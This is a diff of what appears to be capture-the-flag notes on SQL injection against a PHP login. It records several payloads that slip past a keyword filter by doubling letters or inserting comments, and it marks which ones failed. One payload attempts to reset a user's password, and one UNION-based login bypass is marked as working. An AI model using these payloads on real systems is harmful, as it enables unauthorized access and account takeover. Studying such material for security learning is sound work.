@@ -45,25 +45,23 @@ if (isset($username) && isset($password)) {
 
 
 # payload
-1. 
+1. didn't work
 ```SQL
 ' O/**/R '1' = '1; UPDATE users SET `password`= '123' WH/**/ERE `username` = 'kita0421';--
 
 ```
-2. 
+2. didn't work
 ```SQL
 1' OORR '1' = '1' limit 1; --
 ```
-3. 
+3. didn't work
 ```SQL
 ' UORNION select '0','kita0421','1';--
 ' UORNION select 'kita0421','1','0';--
 ' UORNION select 'kita0421','1';--
 ```
-4.
-```SQL
-1' UORNION sORelect 0,'kita0421','pw';--
-1' UORNION sORelect 'kita0421','pw',0;--
-1' UORNION sORelect 'kita0421',0,'pw';--
-1' UORNION sORelect 'pw','kita0421',0;--
+4. worked!!!!!!
+```sql
+--                     id account   pw
+-1' UORNION SORELECT 0,'kita0421','pass';#
 ```
